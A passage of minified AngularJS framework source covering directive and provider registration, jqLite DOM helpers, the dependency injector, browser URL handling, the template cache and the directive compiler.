ngCloak:Le,ngController:Me,ngForm:Ne,ngHide:Oe,ngIf:Pe,ngInclude:Qe,ngInit:Re,ngNonBindable:Se,ngPluralize:Te,ngRepeat:Ue,ngShow:Ve,ngStyle:We,ngSwitch:Xe,ngSwitchWhen:Ye,ngSwitchDefault:Ze,ngOptions:$e,ngTransclude:af,ngModel:bf,ngList:cf,ngChange:df,pattern:Sc,ngPattern:Sc,required:Tc,ngRequired:Tc,minlength:Uc,ngMinlength:Uc,maxlength:Vc,ngMaxlength:Vc,ngValue:ef,ngModelOptions:ff}).directive({ngInclude:gf}).directive(wb).directive(Wc);a.provider({$anchorScroll:hf,$animate:jf,$animateCss:kf,$$animateJs:lf,
$$animateQueue:mf,$$AnimateRunner:nf,$$animateAsyncRun:of,$browser:pf,$cacheFactory:qf,$controller:rf,$document:sf,$$isDocumentHidden:tf,$exceptionHandler:uf,$filter:Xc,$$forceReflow:vf,$interpolate:wf,$interval:xf,$http:yf,$httpParamSerializer:zf,$httpParamSerializerJQLike:Af,$httpBackend:Bf,$xhrFactory:Cf,$jsonpCallbacks:Df,$location:Ef,$log:Ff,$parse:Gf,$rootScope:Hf,$q:If,$$q:Jf,$sce:Kf,$sceDelegate:Lf,$sniffer:Mf,$templateCache:Nf,$templateRequest:Of,$$testability:Pf,$timeout:Qf,$window:Rf,$$rAF:Sf,
$$jqLite:Tf,$$HashMap:Uf,$$cookieReader:Vf})}])}function gb(a,b){return b.toUpperCase()}function xb(a){return a.replace(Wf,gb)}function Yc(a){a=a.nodeType;return 1===a||!a||9===a}function Zc(a,b){var d,c,f=b.createDocumentFragment(),e=[];if($b.test(a)){d=f.appendChild(b.createElement("div"));c=(Xf.exec(a)||["",""])[1].toLowerCase();c=ha[c]||ha._default;d.innerHTML=c[1]+a.replace(Yf,"<$1></$2>")+c[2];for(c=c[0];c--;)d=d.lastChild;e=ab(e,d.childNodes);d=f.firstChild;d.textContent=""}else e.push(b.createTextNode(a));
f.textContent="";f.innerHTML="";q(e,function(a){f.appendChild(a)});return f}function X(a){if(a instanceof X)return a;var b;E(a)&&(a=S(a),b=!0);if(!(this instanceof X)){if(b&&"<"!==a.charAt(0))throw ac("nosel");return new X(a)}if(b){b=z.document;var d;a=(d=Zf.exec(a))?[b.createElement(d[1])]:(d=Zc(a,b))?d.childNodes:[];bc(this,a)}else y(a)?$c(a):bc(this,a)}function cc(a){return a.cloneNode(!0)}function yb(a,b){b||hb(a);if(a.querySelectorAll)for(var d=a.querySelectorAll("*"),c=0,f=d.length;c<f;c++)hb(d[c])}
function ad(a,b,d,c){if(v(c))throw ac("offargs");var f=(c=zb(a))&&c.events,e=c&&c.handle;if(e)if(b){var g=function(b){var c=f[b];v(d)&&$a(c||[],d);v(d)&&c&&0<c.length||(a.removeEventListener(b,e),delete f[b])};q(b.split(" "),function(a){g(a);Ab[a]&&g(Ab[a])})}else for(b in f)"$destroy"!==b&&a.removeEventListener(b,e),delete f[b]}function hb(a,b){var d=a.ng339,c=d&&ib[d];c&&(b?delete c.data[b]:(c.handle&&(c.events.$destroy&&c.handle({},"$destroy"),ad(a)),delete ib[d],a.ng339=void 0))}function zb(a,
b){var d=a.ng339,d=d&&ib[d];b&&!d&&(a.ng339=d=++$f,d=ib[d]={events:{},data:{},handle:void 0});return d}function dc(a,b,d){if(Yc(a)){var c,f=v(d),e=!f&&b&&!F(b),g=!b;a=(a=zb(a,!e))&&a.data;if(f)a[xb(b)]=d;else{if(g)return a;if(e)return a&&a[xb(b)];for(c in b)a[xb(c)]=b[c]}}}function Bb(a,b){return a.getAttribute?-1<(" "+(a.getAttribute("class")||"")+" ").replace(/[\n\t]/g," ").indexOf(" "+b+" "):!1}function Cb(a,b){b&&a.setAttribute&&q(b.split(" "),function(b){a.setAttribute("class",S((" "+(a.getAttribute("class")||
"")+" ").replace(/[\n\t]/g," ").replace(" "+S(b)+" "," ")))})}function Db(a,b){if(b&&a.setAttribute){var d=(" "+(a.getAttribute("class")||"")+" ").replace(/[\n\t]/g," ");q(b.split(" "),function(a){a=S(a);-1===d.indexOf(" "+a+" ")&&(d+=a+" ")});a.setAttribute("class",S(d))}}function bc(a,b){if(b)if(b.nodeType)a[a.length++]=b;else{var d=b.length;if("number"===typeof d&&b.window!==b){if(d)for(var c=0;c<d;c++)a[a.length++]=b[c]}else a[a.length++]=b}}function bd(a,b){return Eb(a,"$"+(b||"ngController")+
"Controller")}function Eb(a,b,d){9===a.nodeType&&(a=a.documentElement);for(b=C(b)?b:[b];a;){for(var c=0,f=b.length;c<f;c++)if(v(d=D.data(a,b[c])))return d;a=a.parentNode||11===a.nodeType&&a.host}}function cd(a){for(yb(a,!0);a.firstChild;)a.removeChild(a.firstChild)}function Fb(a,b){b||yb(a);var d=a.parentNode;d&&d.removeChild(a)}function ag(a,b){b=b||z;if("complete"===b.document.readyState)b.setTimeout(a);else D(b).on("load",a)}function $c(a){function b(){z.document.removeEventListener("DOMContentLoaded",
b);z.removeEventListener("load",b);a()}"complete"===z.document.readyState?z.setTimeout(a):(z.document.addEventListener("DOMContentLoaded",b),z.addEventListener("load",b))}function dd(a,b){var d=Gb[b.toLowerCase()];return d&&ed[xa(a)]&&d}function bg(a,b){var d=function(c,d){c.isDefaultPrevented=function(){return c.defaultPrevented};var e=b[d||c.type],g=e?e.length:0;if(g){if(x(c.immediatePropagationStopped)){var h=c.stopImmediatePropagation;c.stopImmediatePropagation=function(){c.immediatePropagationStopped=
!0;c.stopPropagation&&c.stopPropagation();h&&h.call(c)}}c.isImmediatePropagationStopped=function(){return!0===c.immediatePropagationStopped};var k=e.specialHandlerWrapper||cg;1<g&&(e=ra(e));for(var l=0;l<g;l++)c.isImmediatePropagationStopped()||k(a,c,e[l])}};d.elem=a;return d}function cg(a,b,d){d.call(a,b)}function dg(a,b,d){var c=b.relatedTarget;c&&(c===a||eg.call(a,c))||d.call(a,b)}function Tf(){this.$get=function(){return R(X,{hasClass:function(a,b){a.attr&&(a=a[0]);return Bb(a,b)},addClass:function(a,
b){a.attr&&(a=a[0]);return Db(a,b)},removeClass:function(a,b){a.attr&&(a=a[0]);return Cb(a,b)}})}}function la(a,b){var d=a&&a.$$hashKey;if(d)return"function"===typeof d&&(d=a.$$hashKey()),d;d=typeof a;return d="function"===d||"object"===d&&null!==a?a.$$hashKey=d+":"+(b||ie)():d+":"+a}function Qa(a,b){if(b){var d=0;this.nextUid=function(){return++d}}q(a,this.put,this)}function fd(a){a=(Function.prototype.toString.call(a)+" ").replace(fg,"");return a.match(gg)||a.match(hg)}function ig(a){return(a=fd(a))?
"function("+(a[1]||"").replace(/[\s\r\n]+/," ")+")":"fn"}function eb(a,b){function d(a){return function(b,c){if(F(b))q(b,Fc(a));else return a(b,c)}}function c(a,b){Pa(a,"service");if(y(b)||C(b))b=p.instantiate(b);if(!b.$get)throw da("pget",a);return n[a+"Provider"]=b}function f(a,b){return function(){var c=O.invoke(b,this);if(x(c))throw da("undef",a);return c}}function e(a,b,d){return c(a,{$get:!1!==d?f(a,b):b})}function g(a){fb(x(a)||C(a),"modulesToLoad","not an array");var b=[],c;q(a,function(a){function d(a){var b,
c;b=0;for(c=a.length;b<c;b++){var e=a[b],f=p.get(e[0]);f[e[1]].apply(f,e[2])}}if(!m.get(a)){m.put(a,!0);try{E(a)?(c=Zb(a),b=b.concat(g(c.requires)).concat(c._runBlocks),d(c._invokeQueue),d(c._configBlocks)):y(a)?b.push(p.invoke(a)):C(a)?b.push(p.invoke(a)):tb(a,"module")}catch(e){throw C(a)&&(a=a[a.length-1]),e.message&&e.stack&&-1===e.stack.indexOf(e.message)&&(e=e.message+"\n"+e.stack),da("modulerr",a,e.stack||e.message||e);}}});return b}function h(a,c){function d(b,e){if(a.hasOwnProperty(b)){if(a[b]===
k)throw da("cdep",b+" <- "+l.join(" <- "));return a[b]}try{return l.unshift(b),a[b]=k,a[b]=c(b,e),a[b]}catch(f){throw a[b]===k&&delete a[b],f;}finally{l.shift()}}function e(a,c,f){var g=[];a=eb.$$annotate(a,b,f);for(var h=0,k=a.length;h<k;h++){var l=a[h];if("string"!==typeof l)throw da("itkn",l);g.push(c&&c.hasOwnProperty(l)?c[l]:d(l,f))}return g}return{invoke:function(a,b,c,d){"string"===typeof c&&(d=c,c=null);c=e(a,c,d);C(a)&&(a=a[a.length-1]);d=a;if(La||"function"!==typeof d)d=!1;else{var f=d.$$ngIsClass;
Ia(f)||(f=d.$$ngIsClass=/^(?:class\b|constructor\()/.test(Function.prototype.toString.call(d)+" "));d=f}return d?(c.unshift(null),new (Function.prototype.bind.apply(a,c))):a.apply(b,c)},instantiate:function(a,b,c){var d=C(a)?a[a.length-1]:a;a=e(a,b,c);a.unshift(null);return new (Function.prototype.bind.apply(d,a))},get:d,annotate:eb.$$annotate,has:function(b){return n.hasOwnProperty(b+"Provider")||a.hasOwnProperty(b)}}}b=!0===b;var k={},l=[],m=new Qa([],!0),n={$provide:{provider:d(c),factory:d(e),
service:d(function(a,b){return e(a,["$injector",function(a){return a.instantiate(b)}])}),value:d(function(a,b){return e(a,ma(b),!1)}),constant:d(function(a,b){Pa(a,"constant");n[a]=b;r[a]=b}),decorator:function(a,b){var c=p.get(a+"Provider"),d=c.$get;c.$get=function(){var a=O.invoke(d,c);return O.invoke(b,null,{$delegate:a})}}}},p=n.$injector=h(n,function(a,b){$.isString(b)&&l.push(b);throw da("unpr",l.join(" <- "));}),r={},J=h(r,function(a,b){var c=p.get(a+"Provider",b);return O.invoke(c.$get,c,
void 0,a)}),O=J;n.$injectorProvider={$get:ma(J)};var u=g(a),O=J.get("$injector");O.strictDi=b;q(u,function(a){a&&O.invoke(a)});return O}function hf(){var a=!0;this.disableAutoScrolling=function(){a=!1};this.$get=["$window","$location","$rootScope",function(b,d,c){function f(a){var b=null;Array.prototype.some.call(a,function(a){if("a"===xa(a))return b=a,!0});return b}function e(a){if(a){a.scrollIntoView();var c;c=g.yOffset;y(c)?c=c():Tb(c)?(c=c[0],c="fixed"!==b.getComputedStyle(c).position?0:c.getBoundingClientRect().bottom):
Y(c)||(c=0);c&&(a=a.getBoundingClientRect().top,b.scrollBy(0,a-c))}else b.scrollTo(0,0)}function g(a){a=E(a)?a:Y(a)?a.toString():d.hash();var b;a?(b=h.getElementById(a))?e(b):(b=f(h.getElementsByName(a)))?e(b):"top"===a&&e(null):e(null)}var h=b.document;a&&c.$watch(function(){return d.hash()},function(a,b){a===b&&""===a||ag(function(){c.$evalAsync(g)})});return g}]}function jb(a,b){if(!a&&!b)return"";if(!a)return b;if(!b)return a;C(a)&&(a=a.join(" "));C(b)&&(b=b.join(" "));return a+" "+b}function jg(a){E(a)&&
(a=a.split(" "));var b=W();q(a,function(a){a.length&&(b[a]=!0)});return b}function Aa(a){return F(a)?a:{}}function kg(a,b,d,c){function f(a){try{a.apply(null,wa.call(arguments,1))}finally{if(J--,0===J)for(;O.length;)try{O.pop()()}catch(b){d.error(b)}}}function e(){ia=null;g();h()}function g(){u=A();u=x(u)?null:u;qa(u,B)&&(u=B);B=u}function h(){if(U!==k.url()||H!==u)U=k.url(),H=u,q(K,function(a){a(k.url(),u)})}var k=this,l=a.location,m=a.history,n=a.setTimeout,p=a.clearTimeout,r={};k.isMock=!1;var J=
0,O=[];k.$$completeOutstandingRequest=f;k.$$incOutstandingRequestCount=function(){J++};k.notifyWhenNoOutstandingRequests=function(a){0===J?a():O.push(a)};var u,H,U=l.href,t=b.find("base"),ia=null,A=c.history?function(){try{return m.state}catch(a){}}:w;g();H=u;k.url=function(b,d,e){x(e)&&(e=null);l!==a.location&&(l=a.location);m!==a.history&&(m=a.history);if(b){var f=H===e;if(U===b&&(!c.history||f))return k;var h=U&&Ba(U)===Ba(b);U=b;H=e;!c.history||h&&f?(h||(ia=b),d?l.replace(b):h?(d=l,e=b.indexOf("#"),
e=-1===e?"":b.substr(e),d.hash=e):l.href=b,l.href!==b&&(ia=b)):(m[d?"replaceState":"pushState"](e,"",b),g(),H=u);ia&&(ia=b);return k}return ia||l.href.replace(/%27/g,"'")};k.state=function(){return u};var K=[],I=!1,B=null;k.onUrlChange=function(b){if(!I){if(c.history)D(a).on("popstate",e);D(a).on("hashchange",e);I=!0}K.push(b);return b};k.$$applicationDestroyed=function(){D(a).off("hashchange popstate",e)};k.$$checkUrlChange=h;k.baseHref=function(){var a=t.attr("href");return a?a.replace(/^(https?:)?\/\/[^/]*/,
""):""};k.defer=function(a,b){var c;J++;c=n(function(){delete r[c];f(a)},b||0);r[c]=!0;return c};k.defer.cancel=function(a){return r[a]?(delete r[a],p(a),f(w),!0):!1}}function pf(){this.$get=["$window","$log","$sniffer","$document",function(a,b,d,c){return new kg(a,c,b,d)}]}function qf(){this.$get=function(){function a(a,c){function f(a){a!==n&&(p?p===a&&(p=a.n):p=a,e(a.n,a.p),e(a,n),n=a,n.n=null)}function e(a,b){a!==b&&(a&&(a.p=b),b&&(b.n=a))}if(a in b)throw M("$cacheFactory")("iid",a);var g=0,h=
R({},c,{id:a}),k=W(),l=c&&c.capacity||Number.MAX_VALUE,m=W(),n=null,p=null;return b[a]={put:function(a,b){if(!x(b)){if(l<Number.MAX_VALUE){var c=m[a]||(m[a]={key:a});f(c)}a in k||g++;k[a]=b;g>l&&this.remove(p.key);return b}},get:function(a){if(l<Number.MAX_VALUE){var b=m[a];if(!b)return;f(b)}return k[a]},remove:function(a){if(l<Number.MAX_VALUE){var b=m[a];if(!b)return;b===n&&(n=b.p);b===p&&(p=b.n);e(b.n,b.p);delete m[a]}a in k&&(delete k[a],g--)},removeAll:function(){k=W();g=0;m=W();n=p=null},destroy:function(){m=
h=k=null;delete b[a]},info:function(){return R({},h,{size:g})}}}var b={};a.info=function(){var a={};q(b,function(b,f){a[f]=b.info()});return a};a.get=function(a){return b[a]};return a}}function Nf(){this.$get=["$cacheFactory",function(a){return a("templates")}]}function Qc(a,b){function d(a,b,c){var d=/^\s*([@&<]|=(\*?))(\??)\s*(\w*)\s*$/,e=W();q(a,function(a,f){if(a in n)e[f]=n[a];else{var g=a.match(d);if(!g)throw ea("iscp",b,f,a,c?"controller bindings definition":"isolate scope definition");e[f]=
{mode:g[1][0],collection:"*"===g[2],optional:"?"===g[3],attrName:g[4]||f};g[4]&&(n[a]=e[f])}});return e}function c(a){var b=a.charAt(0);if(!b||b!==P(b))throw ea("baddir",a);if(a!==a.trim())throw ea("baddir",a);}function f(a){var b=a.require||a.controller&&a.name;!C(b)&&F(b)&&q(b,function(a,c){var d=a.match(l);a.substring(d[0].length)||(b[c]=d[0]+c)});return b}var e={},g=/^\s*directive:\s*([\w-]+)\s+(.*)$/,h=/(([\w-]+)(?::([^;]+))?;?)/,k=me("ngSrc,ngSrcset,src,srcset"),l=/^(?:(\^\^?)?(\?)?(\^\^?)?)?/,
m=/^(on[a-z]+|formaction)$/,n=W();this.directive=function U(b,d){fb(b,"name");Pa(b,"directive");E(b)?(c(b),fb(d,"directiveFactory"),e.hasOwnProperty(b)||(e[b]=[],a.factory(b+"Directive",["$injector","$exceptionHandler",function(a,c){var d=[];q(e[b],function(e,g){try{var h=a.invoke(e);y(h)?h={compile:ma(h)}:!h.compile&&h.link&&(h.compile=ma(h.link));h.priority=h.priority||0;h.index=g;h.name=h.name||b;h.require=f(h);var k=h,l=h.restrict;if(l&&(!E(l)||!/[EACM]/.test(l)))throw ea("badrestrict",l,b);k.restrict=
l||"EA";h.$$moduleName=e.$$moduleName;d.push(h)}catch(m){c(m)}});return d}])),e[b].push(d)):q(b,Fc(U));return this};this.component=function(a,b){function c(a){function e(b){return y(b)||C(b)?function(c,d){return a.invoke(b,this,{$element:c,$attrs:d})}:b}var f=b.template||b.templateUrl?b.template:"",g={controller:d,controllerAs:lg(b.controller)||b.controllerAs||"$ctrl",template:e(f),templateUrl:e(b.templateUrl),transclude:b.transclude,scope:{},bindToController:b.bindings||{},restrict:"E",require:b.require};
q(b,function(a,b){"$"===b.charAt(0)&&(g[b]=a)});return g}var d=b.controller||function(){};q(b,function(a,b){"$"===b.charAt(0)&&(c[b]=a,y(d)&&(d[b]=a))});c.$inject=["$injector"];return this.directive(a,c)};this.aHrefSanitizationWhitelist=function(a){return v(a)?(b.aHrefSanitizationWhitelist(a),this):b.aHrefSanitizationWhitelist()};this.imgSrcSanitizationWhitelist=function(a){return v(a)?(b.imgSrcSanitizationWhitelist(a),this):b.imgSrcSanitizationWhitelist()};var p=!0;this.debugInfoEnabled=function(a){return v(a)?
(p=a,this):p};var r=!1;this.preAssignBindingsEnabled=function(a){return v(a)?(r=a,this):r};var J=10;this.onChangesTtl=function(a){return arguments.length?(J=a,this):J};var O=!0;this.commentDirectivesEnabled=function(a){return arguments.length?(O=a,this):O};var u=!0;this.cssClassDirectivesEnabled=function(a){return arguments.length?(u=a,this):u};this.$get=["$injector","$interpolate","$exceptionHandler","$templateRequest","$parse","$controller","$rootScope","$sce","$animate","$$sanitizeUri",function(a,
b,c,f,n,I,B,L,N,G){function T(){try{if(!--za)throw da=void 0,ea("infchng",J);B.$apply(function(){for(var a=[],b=0,c=da.length;b<c;++b)try{da[b]()}catch(d){a.push(d)}da=void 0;if(a.length)throw a;})}finally{za++}}function s(a,b){if(b){var c=Object.keys(b),d,e,f;d=0;for(e=c.length;d<e;d++)f=c[d],this[f]=b[f]}else this.$attr={};this.$$element=a}function Q(a,b,c){ua.innerHTML="<span "+b+">";b=ua.firstChild.attributes;var d=b[0];b.removeNamedItem(d.name);d.value=c;a.attributes.setNamedItem(d)}function Ma(a,
b){try{a.addClass(b)}catch(c){}}function ba(a,b,c,d,e){a instanceof D||(a=D(a));var f=Na(a,b,a,c,d,e);ba.$$addScopeClass(a);var g=null;return function(b,c,d){if(!a)throw ea("multilink");fb(b,"scope");e&&e.needsNewScope&&(b=b.$parent.$new());d=d||{};var h=d.parentBoundTranscludeFn,k=d.transcludeControllers;d=d.futureParentElement;h&&h.$$boundTransclude&&(h=h.$$boundTransclude);g||(g=(d=d&&d[0])?"foreignobject"!==xa(d)&&na.call(d).match(/SVG/)?"svg":"html":"html");d="html"!==g?D(ha(g,D("<div>").append(a).html())):
c?Oa.clone.call(a):a;if(k)for(var l in k)d.data("$"+l+"Controller",k[l].instance);ba.$$addScopeInfo(d,b);c&&c(d,b);f&&f(b,d,d,h);c||(a=f=null);return d}}function Na(a,b,c,d,e,f){function g(a,c,d,e){var f,k,l,m,n,p,r;if(K)for(r=Array(c.length),m=0;m<h.length;m+=3)f=h[m],r[f]=c[f];else r=c;m=0;for(n=h.length;m<n;)k=r[h[m++]],c=h[m++],f=h[m++],c?(c.scope?(l=a.$new(),ba.$$addScopeInfo(D(k),l)):l=a,p=c.transcludeOnThisElement?ja(a,c.transclude,e):!c.templateOnThisElement&&e?e:!e&&b?ja(a,b):null,c(f,l,
k,d,p)):f&&f(a,k.childNodes,void 0,e)}for(var h=[],k=C(a)||a instanceof D,l,m,n,p,K,r=0;r<a.length;r++){l=new s;11===La&&M(a,r,k);m=fc(a[r],[],l,0===r?d:void 0,e);(f=m.length?X(m,a[r],l,b,c,null,[],[],f):null)&&f.scope&&ba.$$addScopeClass(l.$$element);l=f&&f.terminal||!(n=a[r].childNodes)||!n.length?null:Na(n,f?(f.transcludeOnThisElement||!f.templateOnThisElement)&&f.transclude:b);if(f||l)h.push(r,f,l),p=!0,K=K||f;f=null}return p?g:null}function M(a,b,c){var d=a[b],e=d.parentNode,f;if(d.nodeType===
Ja)for(;;){f=e?d.nextSibling:a[b+1];if(!f||f.nodeType!==Ja)break;d.nodeValue+=f.nodeValue;f.parentNode&&f.parentNode.removeChild(f);c&&f===a[b+1]&&a.splice(b+1,1)}}function ja(a,b,c){function d(e,f,g,h,k){e||(e=a.$new(!1,k),e.$$transcluded=!0);return b(e,f,{parentBoundTranscludeFn:c,transcludeControllers:g,futureParentElement:h})}var e=d.$$slots=W(),f;for(f in b.$$slots)e[f]=b.$$slots[f]?ja(a,b.$$slots[f],c):null;return d}function fc(a,b,c,d,e){var f=c.$attr,g;switch(a.nodeType){case 1:g=xa(a);Y(b,
Ca(g),"E",d,e);for(var k,l,m,n,p=a.attributes,K=0,r=p&&p.length;K<r;K++){var A=!1,B=!1;k=p[K];l=k.name;m=k.value;k=Ca(l);(n=Ha.test(k))&&(l=l.replace(gd,"").substr(8).replace(/_(.)/g,function(a,b){return b.toUpperCase()}));(k=k.match(Ka))&&Z(k[1])&&(A=l,B=l.substr(0,l.length-5)+"end",l=l.substr(0,l.length-6));k=Ca(l.toLowerCase());f[k]=l;if(n||!c.hasOwnProperty(k))c[k]=m,dd(a,k)&&(c[k]=!0);ra(a,b,m,k,n);Y(b,k,"A",d,e,A,B)}"input"===g&&"hidden"===a.getAttribute("type")&&a.setAttribute("autocomplete",
"off");if(!Ga)break;f=a.className;F(f)&&(f=f.animVal);if(E(f)&&""!==f)for(;a=h.exec(f);)k=Ca(a[2]),Y(b,k,"C",d,e)&&(c[k]=S(a[3])),f=f.substr(a.index+a[0].length);break;case Ja:ma(b,a.nodeValue);break;case 8:if(!Fa)break;kb(a,b,c,d,e)}b.sort(ka);return b}function kb(a,b,c,d,e){try{var f=g.exec(a.nodeValue);if(f){var h=Ca(f[1]);Y(b,h,"M",d,e)&&(c[h]=S(f[2]))}}catch(k){}}function hd(a,b,c){var d=[],e=0;if(b&&a.hasAttribute&&a.hasAttribute(b)){do{if(!a)throw ea("uterdir",b,c);1===a.nodeType&&(a.hasAttribute(b)&&
e++,a.hasAttribute(c)&&e--);d.push(a);a=a.nextSibling}while(0<e)}else d.push(a);return D(d)}function id(a,b,c){return function(d,e,f,g,h){e=hd(e[0],b,c);return a(d,e,f,g,h)}}function gc(a,b,c,d,e,f){var g;return a?ba(b,c,d,e,f):function(){g||(g=ba(b,c,d,e,f),b=c=f=null);return g.apply(this,arguments)}}function X(a,b,d,e,f,g,h,k,l){function m(a,b,c,d){if(a){c&&(a=id(a,c,d));a.require=t.require;a.directiveName=L;if(B===t||t.$$isolateScope)a=sa(a,{isolateScope:!0});h.push(a)}if(b){c&&(b=id(b,c,d));b.require=
t.require;b.directiveName=L;if(B===t||t.$$isolateScope)b=sa(b,{isolateScope:!0});k.push(b)}}function n(a,e,f,g,l){function m(a,b,c,d){var e;Za(a)||(d=c,c=b,b=a,a=void 0);U&&(e=N);c||(c=U?L.parent():L);if(d){var f=l.$$slots[d];if(f)return f(a,b,e,c,Q);if(x(f))throw ea("noslot",d,ya(L));}else return l(a,b,e,c,Q)}var p,t,u,G,J,N,T,L;b===f?(g=d,L=d.$$element):(L=D(f),g=new s(L,d));J=e;B?G=e.$new(!0):K&&(J=e.$parent);l&&(T=m,T.$$boundTransclude=l,T.isSlotFilled=function(a){return!!l.$$slots[a]});A&&(N=
ca(L,g,T,A,G,e,B));B&&(ba.$$addScopeInfo(L,G,!0,!(I&&(I===B||I===B.$$originalDirective))),ba.$$addScopeClass(L,!0),G.$$isolateBindings=B.$$isolateBindings,t=oa(e,g,G,G.$$isolateBindings,B),t.removeWatches&&G.$on("$destroy",t.removeWatches));for(p in N){t=A[p];u=N[p];var Hb=t.$$bindings.bindToController;if(r){u.bindingInfo=Hb?oa(J,g,u.instance,Hb,t):{};var O=u();O!==u.instance&&(u.instance=O,L.data("$"+t.name+"Controller",O),u.bindingInfo.removeWatches&&u.bindingInfo.removeWatches(),u.bindingInfo=
oa(J,g,u.instance,Hb,t))}else u.instance=u(),L.data("$"+t.name+"Controller",u.instance),u.bindingInfo=oa(J,g,u.instance,Hb,t)}q(A,function(a,b){var c=a.require;a.bindToController&&!C(c)&&F(c)&&R(N[b].instance,V(b,c,L,N))});q(N,function(a){var b=a.instance;if(y(b.$onChanges))try{b.$onChanges(a.bindingInfo.initialChanges)}catch(d){c(d)}if(y(b.$onInit))try{b.$onInit()}catch(e){c(e)}y(b.$doCheck)&&(J.$watch(function(){b.$doCheck()}),b.$doCheck());y(b.$onDestroy)&&J.$on("$destroy",function(){b.$onDestroy()})});
p=0;for(t=h.length;p<t;p++)u=h[p],ta(u,u.isolateScope?G:e,L,g,u.require&&V(u.directiveName,u.require,L,N),T);var Q=e;B&&(B.template||null===B.templateUrl)&&(Q=G);a&&a(Q,f.childNodes,void 0,l);for(p=k.length-1;0<=p;p--)u=k[p],ta(u,u.isolateScope?G:e,L,g,u.require&&V(u.directiveName,u.require,L,N),T);q(N,function(a){a=a.instance;y(a.$postLink)&&a.$postLink()})}l=l||{};for(var p=-Number.MAX_VALUE,K=l.newScopeDirective,A=l.controllerDirectives,B=l.newIsolateScopeDirective,I=l.templateDirective,u=l.nonTlbTranscludeDirective,
J=!1,N=!1,U=l.hasElementTranscludeDirective,G=d.$$element=D(b),t,L,T,O=e,Q,v=!1,Ma=!1,w,z=0,E=a.length;z<E;z++){t=a[z];var Na=t.$$start,M=t.$$end;Na&&(G=hd(b,Na,M));T=void 0;if(p>t.priority)break;if(w=t.scope)t.templateUrl||(F(w)?($("new/isolated scope",B||K,t,G),B=t):$("new/isolated scope",B,t,G)),K=K||t;L=t.name;if(!v&&(t.replace&&(t.templateUrl||t.template)||t.transclude&&!t.$$tlb)){for(w=z+1;v=a[w++];)if(v.transclude&&!v.$$tlb||v.replace&&(v.templateUrl||v.template)){Ma=!0;break}v=!0}!t.templateUrl&&
t.controller&&(A=A||W(),$("'"+L+"' controller",A[L],t,G),A[L]=t);if(w=t.transclude)if(J=!0,t.$$tlb||($("transclusion",u,t,G),u=t),"element"===w)U=!0,p=t.priority,T=G,G=d.$$element=D(ba.$$createComment(L,d[L])),b=G[0],la(f,wa.call(T,0),b),T[0].$$parentNode=T[0].parentNode,O=gc(Ma,T,e,p,g&&g.name,{nonTlbTranscludeDirective:u});else{var ja=W();if(F(w)){T=[];var P=W(),kb=W();q(w,function(a,b){var c="?"===a.charAt(0);a=c?a.substring(1):a;P[a]=b;ja[b]=null;kb[b]=c});q(G.contents(),function(a){var b=P[Ca(xa(a))];
b?(kb[b]=!0,ja[b]=ja[b]||[],ja[b].push(a)):T.push(a)});q(kb,function(a,b){if(!a)throw ea("reqslot",b);});for(var ec in ja)ja[ec]&&(ja[ec]=gc(Ma,ja[ec],e))}else T=D(cc(b)).contents();G.empty();O=gc(Ma,T,e,void 0,void 0,{needsNewScope:t.$$isolateScope||t.$$newScope});O.$$slots=ja}if(t.template)if(N=!0,$("template",I,t,G),I=t,w=y(t.template)?t.template(G,d):t.template,w=Ea(w),t.replace){g=t;T=$b.test(w)?jd(ha(t.templateNamespace,S(w))):[];b=T[0];if(1!==T.length||1!==b.nodeType)throw ea("tplrt",L,"");
la(f,G,b);E={$attr:{}};w=fc(b,[],E);var Y=a.splice(z+1,a.length-(z+1));(B||K)&&aa(w,B,K);a=a.concat(w).concat(Y);fa(d,E);E=a.length}else G.html(w);if(t.templateUrl)N=!0,$("template",I,t,G),I=t,t.replace&&(g=t),n=ga(a.splice(z,a.length-z),G,d,f,J&&O,h,k,{controllerDirectives:A,newScopeDirective:K!==t&&K,newIsolateScopeDirective:B,templateDirective:I,nonTlbTranscludeDirective:u}),E=a.length;else if(t.compile)try{Q=t.compile(G,d,O);var Z=t.$$originalDirective||t;y(Q)?m(null,bb(Z,Q),Na,M):Q&&m(bb(Z,Q.pre),
bb(Z,Q.post),Na,M)}catch(da){c(da,ya(G))}t.terminal&&(n.terminal=!0,p=Math.max(p,t.priority))}n.scope=K&&!0===K.scope;n.transcludeOnThisElement=J;n.templateOnThisElement=N;n.transclude=O;l.hasElementTranscludeDirective=U;return n}function V(a,b,c,d){var e;if(E(b)){var f=b.match(l);b=b.substring(f[0].length);var g=f[1]||f[3],f="?"===f[2];"^^"===g?c=c.parent():e=(e=d&&d[b])&&e.instance;if(!e){var h="$"+b+"Controller";e=g?c.inheritedData(h):c.data(h)}if(!e&&!f)throw ea("ctreq",b,a);}else if(C(b))for(e=
[],g=0,f=b.length;g<f;g++)e[g]=V(a,b[g],c,d);else F(b)&&(e={},q(b,function(b,f){e[f]=V(a,b,c,d)}));return e||null}function ca(a,b,c,d,e,f,g){var h=W(),k;for(k in d){var l=d[k],m={$scope:l===g||l.$$isolateScope?e:f,$element:a,$attrs:b,$transclude:c},n=l.controller;"@"===n&&(n=b[l.name]);m=I(n,m,!0,l.controllerAs);h[l.name]=m;a.data("$"+l.name+"Controller",m.instance)}return h}function aa(a,b,c){for(var d=0,e=a.length;d<e;d++)a[d]=Ub(a[d],{$$isolateScope:b,$$newScope:c})}function Y(b,c,f,g,h,k,l){if(c===
h)return null;var m=null;if(e.hasOwnProperty(c)){h=a.get(c+"Directive");for(var n=0,p=h.length;n<p;n++)if(c=h[n],(x(g)||g>c.priority)&&-1!==c.restrict.indexOf(f)){k&&(c=Ub(c,{$$start:k,$$end:l}));if(!c.$$bindings){var K=m=c,r=c.name,A={isolateScope:null,bindToController:null};F(K.scope)&&(!0===K.bindToController?(A.bindToController=d(K.scope,r,!0),A.isolateScope={}):A.isolateScope=d(K.scope,r,!1));F(K.bindToController)&&(A.bindToController=d(K.bindToController,r,!0));if(A.bindToController&&!K.controller)throw ea("noctrl",
r);m=m.$$bindings=A;F(m.isolateScope)&&(c.$$isolateBindings=m.isolateScope)}b.push(c);m=c}}return m}function Z(b){if(e.hasOwnProperty(b))for(var c=a.get(b+"Directive"),d=0,f=c.length;d<f;d++)if(b=c[d],b.multiElement)return!0;return!1}function fa(a,b){var c=b.$attr,d=a.$attr;q(a,function(d,e){"$"!==e.charAt(0)&&(b[e]&&b[e]!==d&&(d=d.length?d+(("style"===e?";":" ")+b[e]):b[e]),a.$set(e,d,!0,c[e]))});q(b,function(b,e){a.hasOwnProperty(e)||"$"===e.charAt(0)||(a[e]=b,"class"!==e&&"style"!==e&&(d[e]=c[e]))})}
